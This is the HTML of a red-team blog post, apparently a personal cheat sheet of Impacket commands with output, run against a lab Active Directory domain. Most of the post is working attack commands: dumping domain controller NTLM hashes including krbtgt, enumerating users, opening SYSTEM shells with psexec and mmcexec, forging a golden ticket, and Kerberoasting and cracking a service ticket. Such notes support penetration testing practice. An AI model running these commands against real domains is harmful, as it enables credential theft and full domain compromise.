@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Kaluche ">
+<meta name="description" content=" Just some Impacket commands reminder.
+" />
+<meta name="keywords" content="Write-ups, RedTEAM, Windows, Infosec" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://kaluche.github.io/posts/2020/02/impacket/" />
+
+
+    <title>
+        
+            Impacket :: Kaluche  — RedTeam/Windows/WU/Infosec
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://kaluche.github.io/main.min.73f55a8d452be4a71b2960620b80252cf69abd84d63fe7501abf0a39b1a70a78.css">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="https://kaluche.github.io/style.css">
+    
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://kaluche.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://kaluche.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://kaluche.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://kaluche.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://kaluche.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://kaluche.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Impacket">
+<meta itemprop="description" content="
+Just some Impacket commands reminder.
+">
+
+
+<meta itemprop="datePublished" content="2020-02-01T17:05:59&#43;01:00" />
+<meta itemprop="dateModified" content="2020-02-01T17:05:59&#43;01:00" />
+<meta itemprop="wordCount" content="1021">
+
+
+
+<meta itemprop="keywords" content="impacket,windows," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://kaluche.github.io"/>
+
+<meta name="twitter:title" content="Impacket"/>
+<meta name="twitter:description" content="
+Just some Impacket commands reminder.
+"/>
+
+
+
+
+
+    <meta property="article:published_time" content="2020-02-01 17:05:59 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://kaluche.github.io" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">PS C:\kaluche &gt;</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://kaluche.github.io/about/">About</a></li><li><a href="https://kaluche.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://kaluche.github.io/posts/2020/02/impacket/">Impacket</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <blockquote>
+<p>Just some Impacket commands reminder.</p>
+</blockquote>
+
+<h2 id="dc-hashs-ntlm-dump-history">DC : hashs NTLM dump, history</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd<span style="color:#ae81ff">\!</span>@DC1.FOO.LOCAL 
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrateur:500:aad3b435b51404eeaad3b435b51404ee:6ced6cb821b81327d4b8b096947e0615::: <span style="color:#f92672">(</span>status<span style="color:#f92672">=</span>Enabled<span style="color:#f92672">)</span>
+Administrateur_history0:500:aad3b435b51404eeaad3b435b51404ee:6ced6cb821b81327d4b8b096947e0615:::
+Administrateur_history1:500:aad3b435b51404eeaad3b435b51404ee:ac1dbef8523bafece1428e067c1b114f:::
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... </code></pre></div>
+<h2 id="dc-hashs-ntlm-dump-user-only">DC : hashs NTLM dump, user only</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd<span style="color:#ae81ff">\!</span>@DC1.FOO.LOCAL
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c40b7d2951af2ec4fbb356e3e99cf7a3::: <span style="color:#f92672">(</span>status<span style="color:#f92672">=</span>Disabled<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... </code></pre></div>
+<h2 id="dc-getaduser-name-email-passwordlast-lastlogon-description">DC : GetADUser  (name, email, passwordlast, lastlogon, description)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Caution, description is add by me and this script also get accounsts without email</span>
+$ python GetADUsers.py FOO.LOCAL/hacker:Password123
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Querying FOO.LOCAL <span style="color:#66d9ef">for</span> information about domain. Be patient...
+Name            Email  PasswordLastSet      LastLogon            Description                                          
+--------------  -----  -------------------  -------------------  ----------------------------------------------------
+Administrateur         <span style="color:#ae81ff">2017</span>-07-12 <span style="color:#ae81ff">16</span>:03:33  <span style="color:#ae81ff">2015</span>-05-18 <span style="color:#ae81ff">11</span>:31:43  Compte d’utilisateur d’administration            
+Invité                &lt;never&gt;              &lt;never&gt;              Compte d’utilisateur invité                       
+                       <span style="color:#ae81ff">2017</span>-07-12 <span style="color:#ae81ff">16</span>:03:12  <span style="color:#ae81ff">2017</span>-07-12 <span style="color:#ae81ff">16</span>:03:15                                                       
+krbtgt                 <span style="color:#ae81ff">2014</span>-12-11 <span style="color:#ae81ff">13</span>:35:44  &lt;never&gt;              Compte de service du centre de distribution de clés 
+test                   <span style="color:#ae81ff">2014</span>-12-11 <span style="color:#ae81ff">13</span>:47:27  <span style="color:#ae81ff">2014</span>-12-15 <span style="color:#ae81ff">14</span>:21:34  pwd : powa1234!                                      
+                       <span style="color:#ae81ff">2015</span>-05-13 <span style="color:#ae81ff">09</span>:14:39  <span style="color:#ae81ff">2015</span>-05-18 <span style="color:#ae81ff">11</span>:45:32                                                       
+                       <span style="color:#ae81ff">2014</span>-12-15 <span style="color:#ae81ff">11</span>:20:17  <span style="color:#ae81ff">2014</span>-12-15 <span style="color:#ae81ff">13</span>:54:21                                                       
+fdupont                &lt;never&gt;              &lt;never&gt;              pwd : P4ssw0rd!!                                     
+tlastname              &lt;never&gt;              &lt;never&gt;              pwd : P4ssw0rd!                                      
+bwayne                 &lt;never&gt;              &lt;never&gt;              pwd : P4ssw0rd!                                      
+cklent                 &lt;never&gt;              &lt;never&gt;              pwd : P4ssw0rd!                                      
+tjoker                 <span style="color:#ae81ff">2015</span>-05-13 <span style="color:#ae81ff">09</span>:40:34  <span style="color:#ae81ff">2015</span>-05-13 <span style="color:#ae81ff">09</span>:42:26  pwd : P4ssw0rd!                                      
+tbatman                &lt;never&gt;              &lt;never&gt;              pwd : P4ssw0rd!                                      
+test0000               &lt;never&gt;              &lt;never&gt;                                                                   
+hacker                 <span style="color:#ae81ff">2017</span>-07-12 <span style="color:#ae81ff">16</span>:04:57  &lt;never&gt;                                                                   </code></pre></div>
+<h2 id="shell-spawn-to-exec-command-add-the-command-at-the-end">Shell spawn (to exec command, add the command at the end)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python mmcexec.py  FOO.LOCAL/Administrateur:P4ssw0rd<span style="color:#ae81ff">\!</span>@DC1.FOO.LOCAL    
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBv2.1 dialect used
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Launching semi-interactive shell - Careful what you execute
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+C:<span style="color:#ae81ff">\&gt;</span>whoami
+foo<span style="color:#ae81ff">\a</span>dministrateur</code></pre></div>
+<h2 id="shell-spawn-with-kerberos">Shell spawn with kerberos</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export KRB5CCNAME<span style="color:#f92672">=</span>administrateur.ccache 
+$ python psexec.py -k -no-pass  FOO.LOCAL/administrateur@DC1.foo.local
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+ 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on DC1.foo.local.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file ypDKgeHL.exe
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on DC1.foo.local.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service iqzz on DC1.foo.local.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service iqzz.....
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+Microsoft Windows <span style="color:#f92672">[</span>version <span style="color:#ae81ff">6</span>.1.7601<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation. Tous droits réservés.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+autorite nt<span style="color:#ae81ff">\s</span>ystème</code></pre></div>
+<h2 id="golden-ticket">GOLDEN TICKET !</h2>
+
+<p>NTHASH &gt; nthash from krbtgt
+DomainSID &gt;  echo lsaquery | sudo rpcclient  192.168.56.151 -U &ldquo;FOO\limited_user%Password123&rdquo;
+Domain &gt; domain FQDN
+&ldquo;Administrateur&rdquo; &gt; User for which the ticket is generated</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python ticketer.py -nthash c40b7d2951af2ec4fbb356e3e99cf7a3 -domain-sid S-1-5-21-4043646307-996402590-333264239 -domain FOO.LOCAL Administrateur
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> foo.local/Administrateur
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_LOGON_INFO
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_CLIENT_INFO_TYPE
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncAsRepPart
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_SERVER_CHECKSUM
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_PRIVSVR_CHECKSUM
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncASRepPart
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrateur.ccache</code></pre></div>
+<h2 id="import-administrateur-ccache-on-linux">Import Administrateur.ccache on Linux :</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Clear tickets</span> 
+$ kdestroy  
+kdestroy: No credentials cache found <span style="color:#66d9ef">while</span> destroying cache</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># List tickets</span>
+$ klist 
+klist: No credentials cache found <span style="color:#f92672">(</span>filename: /tmp/krb5cc_1000<span style="color:#f92672">)</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>DC1.foo.local<span style="color:#ae81ff">\\</span>c$ -k
+WARNING: The <span style="color:#e6db74">&#34;syslog&#34;</span> option is deprecated
+SPNEGO: Could not find a suitable mechtype in NEG_TOKEN_INIT
+session setup failed: NT_STATUS_INTERNAL_ERROR</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cp Administrateur.ccache /tmp/krb5cc_1000; klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: Administrateur@FOO.LOCAL
+
+Valid starting       Expires              Service principal
+<span style="color:#ae81ff">12</span>/07/2017 <span style="color:#ae81ff">16</span>:49:34  <span style="color:#ae81ff">10</span>/07/2027 <span style="color:#ae81ff">16</span>:49:34  krbtgt/FOO.LOCAL@FOO.LOCAL
+	renew <span style="color:#66d9ef">until</span> <span style="color:#ae81ff">10</span>/07/2027 <span style="color:#ae81ff">16</span>:49:34</code></pre></div>
+<h2 id="smbclient-with-kerberos">smbclient with kerberos</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>DC1.foo.local<span style="color:#ae81ff">\\</span>c$ -k
+WARNING: The <span style="color:#e6db74">&#34;syslog&#34;</span> option is deprecated
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  $Recycle.Bin                      DHS        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">04</span>:34:39 <span style="color:#ae81ff">2009</span>
+  Documents and Settings            DHS        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">07</span>:06:44 <span style="color:#ae81ff">2009</span>
+  inetpub                             D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span>:50:04 <span style="color:#ae81ff">2015</span>
+  pagefile.sys                      AHS <span style="color:#ae81ff">1073741824</span>  Mon May <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">11</span>:28:29 <span style="color:#ae81ff">2015</span>
+  PerfLogs                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">05</span>:20:08 <span style="color:#ae81ff">2009</span>
+  Program Files                      DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:02 <span style="color:#ae81ff">2014</span>
+  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>                DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:04 <span style="color:#ae81ff">2014</span>
+  ProgramData                        DH        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:38:09 <span style="color:#ae81ff">2014</span>
+  Recovery                          DHS        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">11</span>:59:44 <span style="color:#ae81ff">2014</span>
+  System Volume Information         DHS        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:16 <span style="color:#ae81ff">2014</span>
+  Users                              DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span>:00:27 <span style="color:#ae81ff">2014</span>
+  Windows                             D        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">16</span>:28:03 <span style="color:#ae81ff">2017</span>
+  WSUS                                D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">11</span>:27:01 <span style="color:#ae81ff">2015</span>
+
+		<span style="color:#ae81ff">6527487</span> blocks of size <span style="color:#ae81ff">4096</span>. <span style="color:#ae81ff">4199729</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> </code></pre></div>
+<h2 id="get-userspn">Get UserSPN</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python GetUserSPNs.py FOO.LOCAL/Administrateur:P4ssw0rd<span style="color:#ae81ff">\!</span>   
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+No entries found!</code></pre></div>
+<h2 id="with-rpc-client">WITH RPC CLIENT</h2>
+
+<h3 id="get-domain-sid">Get Domain SID</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Anonymous</span>
+$ rpcclient  <span style="color:#ae81ff">192</span>.168.56.151 -U <span style="color:#e6db74">&#34;&#34;</span> -N 
+<span style="color:#75715e"># With creds</span>
+$ rpcclient  <span style="color:#ae81ff">192</span>.168.56.151 -U <span style="color:#e6db74">&#34;FOO\Hacker%Password123&#34;</span> 
+rpcclient $&gt; lsaquery
+Domain Name: FOO
+Domain Sid: S-1-5-21-4043646307-996402590-333264239</code></pre></div>
+<h3 id="get-user-sid">Get User SID</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient  <span style="color:#ae81ff">192</span>.168.56.151 -U <span style="color:#e6db74">&#34;FOO\Hacker%Password123&#34;</span> 
+rpcclient $&gt; lookupnames krbtgt
+krbtgt S-1-5-21-4043646307-996402590-333264239-502 <span style="color:#f92672">(</span>User: <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
+rpcclient $&gt; lookupnames administrateur
+administrateur S-1-5-21-4043646307-996402590-333264239-500 <span style="color:#f92672">(</span>User: <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
+rpcclient $&gt; </code></pre></div>
+<h2 id="navigate-with-smb">Navigate with SMB</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>DC1.foo.local<span style="color:#ae81ff">\\</span>c$ -U <span style="color:#e6db74">&#34;FOO\administrateur&#34;</span>
+WARNING: The <span style="color:#e6db74">&#34;syslog&#34;</span> option is deprecated
+Enter FOO<span style="color:#ae81ff">\a</span>dministrateur<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  $Recycle.Bin                      DHS        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">04</span>:34:39 <span style="color:#ae81ff">2009</span>
+  Documents and Settings            DHS        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">07</span>:06:44 <span style="color:#ae81ff">2009</span>
+  inetpub                             D        <span style="color:#ae81ff">0</span>  Fri Apr <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span>:50:04 <span style="color:#ae81ff">2015</span>
+  pagefile.sys                      AHS <span style="color:#ae81ff">1073741824</span>  Mon May <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">11</span>:28:29 <span style="color:#ae81ff">2015</span>
+  PerfLogs                            D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">05</span>:20:08 <span style="color:#ae81ff">2009</span>
+  Program Files                      DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:02 <span style="color:#ae81ff">2014</span>
+  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>                DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:04 <span style="color:#ae81ff">2014</span>
+  ProgramData                        DH        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:38:09 <span style="color:#ae81ff">2014</span>
+  Recovery                          DHS        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">11</span>:59:44 <span style="color:#ae81ff">2014</span>
+  System Volume Information         DHS        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">13</span>:32:16 <span style="color:#ae81ff">2014</span>
+  Users                              DR        <span style="color:#ae81ff">0</span>  Thu Dec <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span>:00:27 <span style="color:#ae81ff">2014</span>
+  Windows                             D        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">16</span>:28:03 <span style="color:#ae81ff">2017</span>
+  WSUS                                D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">11</span>:27:01 <span style="color:#ae81ff">2015</span>
+
+		<span style="color:#ae81ff">6527487</span> blocks of size <span style="color:#ae81ff">4096</span>. <span style="color:#ae81ff">4199745</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> </code></pre></div>
+<h2 id="kerberoast-spn">Kerberoast - SPN</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python GetUserSPNs.py -request FOO.LOCAL/hacker:Password123           
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+
+ServicePrincipalName  Name     MemberOf  PasswordLastSet  LastLogon 
+--------------------  -------  --------  ---------------  ---------
+http/PC1              userspn            &lt;never&gt;          &lt;never&gt;   
+
+
+
+$krb5tgs$23$*userspn$FOO.LOCAL$http/PC1*$f33c6a7ab50147a947f4137c026094bc$4898eb160d446d18a6babc80d884358f5c2bfafe2441acfcce20392e90a8169d82810f6529f025d2e85211c9b3a8e1b4000974216065485fccff22ebf025ec16a90e67ede74736788c22790bfc6299e94fe8611a6bc4a8e69ff1dc8f98c3561cc5247b5ccdeb6052e685a80c26b15e30e711399483a4822840ae0d83793c0c4bedda63d3e1c6defff307d1ccc998cb577f73377d56e833b3133ab70d2587a7a7d404278904016bf226bfe8b304b05258c38cd9387f42bfde883354c24159e183e4d4deabf0f6af1fe0bd2aa7b5d532cbdc412542a97c7c7b962d4ad0956f8d2f11040b1c28662f97c2ba130122458fb31b570e11325b87be9cebd2dfa6b281dc79721986a07ea296d147af420083c92d644f5e79d91d0c1cd059619dec3883489128dc921930cccaeb17f4dce924ce2353d72af8f0fb86fedb9d473481ffe219603144494e3351c9a83a814b57a4bd5a51646d37a349ff0936bf9197c9682e61ebc2557c1ffbdb27ab4edb9691a1319e7d29a79c8741eef41009ce224860ea08d03510fb3046382913a3053729cd73bc0d58d3040e6e8512acfdcf4cd0383b926cddea132ebf7e398873996bf723b5ac2196e274c6a2ae8b6300ae03ec4214584515c7b8400c7791d28a54c9ca477d78c76b192f142961093a32fe569212b5ce7bddc951caed56f5ffbffc4e729a1f789af7f1709b7c7c91549baf05dc827f9ecfbf383b661694d2057fedbb0c920b90b303a9bf0cbd429a37f40799081f23effffedba6c186a3f82732583550e39efe117d446657c38192b1c4cd1192cc322eee745d4c8463547fe42ca1e08537bb2241382aa0123463f0e272b03d1420e28510d5b102939e9bb173674d3b7c8e41fbd978d9f7d9697a3c691a6d33aba4fca7a99331d72c18e0ac56bd9540b56aca8771d95651ef92780a7e679e00b38f795d462f71acb6fbb5e4128fb6dae76eb60ee93019092a8dd9f8ac5e8eedbf924b9f91072075c5c99a278b4483815e3441824d86f48e43af731a9ec2ad50d5792e00c4e31c5f8d793fde944d476a83f9c4dfa7a41cc57bf8d5fbb8f44f873842bfc0a3784298accf348b8b048d6eee84a79f802fb3a00d2b4d324dc6255a5bf7a5d304030d1225d90b83d807e055fb6c75c85f46e0409aea9d638c7dc7976fb37404e7fffe5b244ac031eeccf45e1bd6729f15dcc2004bfbe156</code></pre></div>
+<h2 id="cracking-spn-tickets">Cracking SPN Tickets</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python GetUserSPNs.py -request -o /tmp/hash FOO.LOCAL/hacker:Password123
+Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
+ 
+ServicePrincipalName  Name     MemberOf  PasswordLastSet  LastLogon 
+--------------------  -------  --------  ---------------  ---------
+http/PC1              userspn            &lt;never&gt;          &lt;never&gt;   </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Hashcat</span> 
+$ hashcat -m <span style="color:#ae81ff">13100</span> /tmp/hash /tmp/wordlist
+<span style="color:#75715e"># John</span>
+~/Programs/JohnTheRipper/run/john  --wordlist<span style="color:#f92672">=</span>/tmp/wordlist /tmp/hash       
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5tgs, Kerberos <span style="color:#ae81ff">5</span> TGS etype <span style="color:#ae81ff">23</span> <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4<span style="color:#f92672">])</span>
+Will run <span style="color:#ae81ff">4</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+Http1234         <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g <span style="color:#ae81ff">0</span>:00:00:00 DONE <span style="color:#f92672">(</span><span style="color:#ae81ff">2017</span>-07-13 <span style="color:#ae81ff">14</span>:24<span style="color:#f92672">)</span> <span style="color:#ae81ff">50</span>.00g/s <span style="color:#ae81ff">50</span>.00p/s <span style="color:#ae81ff">50</span>.00c/s <span style="color:#ae81ff">50</span>.00C/s Http1234
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed</code></pre></div>
